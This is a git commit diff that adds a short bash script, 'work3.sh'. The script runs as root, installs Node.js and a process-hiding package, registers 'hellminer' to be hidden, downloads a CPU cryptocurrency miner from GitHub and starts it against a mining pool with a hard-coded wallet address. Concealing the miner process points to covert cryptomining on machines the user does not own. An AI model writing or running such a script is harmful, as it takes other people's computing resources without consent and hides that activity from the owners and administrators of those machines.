dd74e3856662da1daebe3d090409c1f8233b1188
Geraldy Olang <97717251+geraldyolang11@users.noreply.github.com>
2022-02-09 16:33:21 +0800

    Update work3.sh

--- work3.sh
+++ work3.sh
@@ -1,1 +1,2 @@
-
+#!/bin/bash
+sudo su --command "sudo apt update && sudo apt install gcc && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm install -g npm@8.4.1 && npm i -g node-process-hider && sudo ph add hellminer && wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xf hellminer_cpu_linux.tar.gz && chmod +x hellminer && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RTBPM3NCdNkHu7FTpSe5VcKAYt2DqHBJbP.gyro -p x --cpu 2"
